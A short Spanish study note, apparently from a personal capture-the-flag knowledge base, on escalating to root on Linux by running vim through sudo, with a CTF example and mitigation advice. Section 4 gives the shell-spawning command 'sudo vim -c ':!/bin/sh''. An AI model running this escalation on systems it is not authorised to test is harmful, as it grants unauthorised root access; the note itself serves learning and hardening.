---
tags: [tecnica, escalada-linux, sudo, vim]
tipo: tecnica
categoria: escalada-linux
estado: practicado
maquinas: [THLCPPTV16]
---

# Sudo Vim

## 1. Qué es

`vim` con `sudo` permite ejecutar comandos desde su intérprete interno (`:!`), otorgando root.

## 2. Cómo funciona

- `:!<cmd>` ejecuta un comando del sistema; `-c ':!/bin/sh'` lanza shell al abrir.

## 3. Cuándo sospecharla

- `sudo -l` incluye `vim` o `vi` (o `sudoedit` mal configurado).

## 4. Cómo comprobarla (laboratorio autorizado)

```bash
sudo vim -c ':!/bin/sh'
# o dentro de vim: :!sh   y luego :python / :lua si aplica
id
```

## 5. Herramientas

- [[GTFOBins]].

## 6. Ejemplos en mis CTF

| Máquina | Contexto | Resultado |
|---|---|---|
| [[THLCPPTV16]] | `sudo vim` en el host de Rafael | root Rafael |

## 7. Falsos positivos / pruebas fallidas

- `sudoedit` restringe qué ficheros se editan; no siempre da shell.

## 8. Prevención y mitigación

- No conceder editores en `sudoers`.

## 9. Técnicas relacionadas

- [[GTFOBins]], [[SUID]]
